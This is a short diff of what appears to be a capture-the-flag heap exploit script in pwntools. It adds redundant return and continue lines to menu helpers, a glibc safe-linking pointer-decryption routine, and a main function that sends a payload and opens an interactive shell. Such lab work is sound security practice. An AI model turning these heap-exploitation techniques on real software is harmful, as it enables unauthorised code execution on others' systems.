@@ -27,17 +27,20 @@ def add(io, size: int, data: bytes):
     io.sendlineafter(">> ", "1")
     io.sendlineafter("input chunk size : ", str(size))
     io.sendlineafter("input chunk data : ", data)
+    return
 
 
 def free(io, index: int):
     io.sendlineafter(">> ", "2")
     io.sendlineafter("input chunk id : ", str(index))
+    return
 
 
 def modify(io, index: int, data: bytes):
     io.sendlineafter(">> ", "3")
     io.sendlineafter("input chunk id : ", str(index))
     io.sendlineafter("modify chunk data(max 40) : ", data)
+    return
 
 
 def view(io, index: int) -> bytes:
@@ -57,6 +60,7 @@ def decrypt(cipher: int) -> int:
             bits = 0
         plain = ((cipher ^ key) >> bits) << bits
         key = plain >> 12
+        continue
 
     return plain
 
@@ -131,6 +135,7 @@ def main():
 
     add(io, 0x90, payload)  # 15
     io.sh()
+    return
 
 
 if __name__ == "__main__":
